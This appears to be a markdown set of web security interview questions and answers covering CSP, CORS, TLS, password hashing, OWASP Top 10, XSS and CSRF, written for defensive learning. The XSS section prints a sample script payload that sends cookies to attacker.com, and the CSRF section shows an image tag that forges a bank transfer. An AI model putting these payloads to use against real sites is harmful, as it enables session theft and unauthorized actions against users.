# Security Interview Questions

## Content Security Policy (CSP)

<details>
<summary><b>What is Content Security Policy (CSP)?</b></summary>

CSP is a browser security feature. It controls which scripts, styles, and resources are allowed to load via HTTP headers. This helps protect websites from attacks like XSS. Example: `Content-Security-Policy: script-src 'self'` only allows scripts from same origin.
</details>

## CORS

<details>
<summary><b>What is CORS?</b></summary>

CORS (Cross-Origin Resource Sharing) is a browser rule that controls requests between different websites. The server decides which origins are allowed via `Access-Control-Allow-Origin` header. This helps prevent unauthorized data access. Preflight requests (`OPTIONS`) check permissions first.
</details>

## SSL / TLS

<details>
<summary><b>What is SSL/TLS Handshake?</b></summary>

This process creates a secure connection between client and server. Steps: client hello → server hello + certificate → key exchange → encrypted session established. It verifies server identity and sets encryption keys. After the handshake, all data is sent securely (HTTPS).
</details>

## Logging

<details>
<summary><b>What is basic logging and why is it important for security?</b></summary>

Recording application events. Security importance: detect attacks, audit user actions, investigate incidents, compliance requirements. Log: auth attempts, errors, access to sensitive data. Don't log: passwords, tokens, PII. Use structured logging (JSON).
</details>

## npm Audit

<details>
<summary><b>What is npm audit and how do you use it?</b></summary>

Built-in npm command that checks dependencies for known vulnerabilities. Run: `npm audit`. Fix: `npm audit fix`. Shows: vulnerability severity, affected package, fix available. Run regularly, include in CI. Also: Snyk, Dependabot for automated checks.
</details>

## Sensitive Data

<details>
<summary><b>How do you handle sensitive data in your applications?</b></summary>

- Store in environment variables, not code
- Use secrets management (Vault, AWS Secrets Manager)
- Encrypt at rest and in transit (HTTPS)
- Minimize data collection
- Mask in logs and UI
- Access control (who can see what)
- Secure deletion when not needed
</details>

## Encryption & Hashing

<details>
<summary><b>What is the difference between encryption and hashing?</b></summary>

- **Encryption**: Reversible with key. Two-way. Used for data that needs to be read later
- **Hashing**: One-way, irreversible. Same input = same output. Used for verification
</details>

<details>
<summary><b>When would you use encryption vs hashing?</b></summary>

- **Hashing**: Passwords, data integrity verification, checksums
- **Encryption**: Sensitive data storage, secure communication, data that needs retrieval

Passwords: always hash, never encrypt.
</details>

<details>
<summary><b>What are common encryption algorithms?</b></summary>

- **Symmetric** (same key): AES (recommended), DES (outdated)
- **Asymmetric** (public/private keys): RSA, ECDSA
- **Hashing**: bcrypt (passwords), SHA-256, Argon2

Use established libraries, don't implement yourself.
</details>

## Password Security

<details>
<summary><b>How do you securely store passwords?</b></summary>

Never store plain text. Hash with bcrypt, Argon2, or scrypt. Use salt (unique per password, stored with hash). Use high work factor (slow = harder to brute force). Never: MD5, SHA1, unsalted hashes.
</details>

## Security Audits

<details>
<summary><b>How do you perform a basic security audit?</b></summary>

Check: dependencies (npm audit), HTTPS everywhere, input validation, authentication/authorization, error handling (no sensitive info), security headers, CORS config, environment variables. Use OWASP checklist. Consider penetration testing.
</details>

## OWASP

<details>
<summary><b>What is OWASP?</b></summary>

Open Web Application Security Project. Non-profit providing: security guidelines, tools, documentation. Famous for OWASP Top 10 - most critical web security risks. Free resources for developers and security professionals.
</details>

<details>
<summary><b>Can you explain the OWASP Top 10 vulnerabilities?</b></summary>

Top risks (2021):
1. **Broken Access Control**: Unauthorized actions
2. **Cryptographic Failures**: Weak encryption, exposed data
3. **Injection**: SQL, XSS, command injection
4. **Insecure Design**: Missing security in architecture
5. **Security Misconfiguration**: Default configs, unnecessary features
6. **Vulnerable Components**: Outdated dependencies
7. **Authentication Failures**: Weak passwords, session issues
8. **Data Integrity Failures**: Untrusted deserialization
9. **Logging Failures**: Missing audit trails
10. **SSRF**: Server-side request forgery
</details>

## Common Vulnerabilities

<details>
<summary><b>How do you prevent common security vulnerabilities (XSS, CSRF, SQL Injection)?</b></summary>

- **XSS**: Escape output, use CSP headers, sanitize HTML input, React escapes by default
- **CSRF**: Use CSRF tokens, SameSite cookies, verify Origin header
- **SQL Injection**: Use parameterized queries/prepared statements, never concatenate user input into queries, use ORM

General: validate all input, principle of least privilege, keep dependencies updated.
</details>

## XSS (Cross-Site Scripting)

<details>
<summary><b>What is XSS and what are its types?</b></summary>

XSS allows attackers to inject malicious scripts into web pages viewed by other users. Three main types:

- **Stored XSS**: Malicious script is permanently stored on target server (database, comments). Executes when users load the page. Most dangerous
- **Reflected XSS**: Script is reflected off web server (search results, error messages). Requires victim to click malicious link
- **DOM-based XSS**: Vulnerability exists in client-side code. Script modifies DOM without server involvement. Harder to detect

Example attack: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
</details>

<details>
<summary><b>How do you protect against XSS attacks?</b></summary>

- **Escape output**: Convert `<`, `>`, `&`, `"`, `'` to HTML entities
- **Use CSP headers**: Restrict script sources with `Content-Security-Policy`
- **Sanitize HTML input**: Use libraries like DOMPurify for user-generated HTML
- **Use HTTPOnly cookies**: Prevents JavaScript access to sensitive cookies
- **Framework protection**: React, Vue, Angular escape by default - avoid `dangerouslySetInnerHTML`
- **Validate input**: Reject or sanitize unexpected characters
</details>

## CSRF (Cross-Site Request Forgery)

<details>
<summary><b>What is CSRF and how does it work?</b></summary>

CSRF tricks authenticated users into performing unwanted actions. Attacker creates malicious page that makes requests to target site using victim's credentials (cookies sent automatically).

Example: User logged into bank. Attacker's page contains: `<img src="https://bank.com/transfer?to=attacker&amount=1000">`. Browser sends request with user's cookies.

Requirements for CSRF: user must be authenticated, predictable request parameters, no additional verification.
</details>

<details>
<summary><b>How do you protect against CSRF attacks?</b></summary>

- **CSRF tokens**: Include unique, unpredictable token in forms. Server validates token matches session
- **SameSite cookies**: Set `SameSite=Strict` or `SameSite=Lax` to prevent cross-origin cookie sending
- **Verify Origin/Referer headers**: Check request came from your domain
- **Double submit cookies**: Send CSRF token in both cookie and request body
- **Require re-authentication**: For sensitive actions (password change, money transfer)

Modern frameworks (Django, Rails, Express with csurf) provide built-in CSRF protection.
</details>

<details>
<summary><b>What is the difference between XSS and CSRF?</b></summary>

| Aspect | XSS | CSRF |
|--------|-----|------|
| Attack type | Executes malicious JS | Sends unwanted request |
| Code execution | In victim's browser | No JS needed |
| Control | Full DOM control | Uses cookie trust |
| Target | Attacks the user | Attacks server via user |

**XSS**: Attacker executes arbitrary JavaScript in victim's browser through the trusted site.

**CSRF**: Attacker tricks browser into sending request to trusted site using victim's existing authentication.

Key distinction: XSS injects and runs code, CSRF exploits existing authentication.
</details>
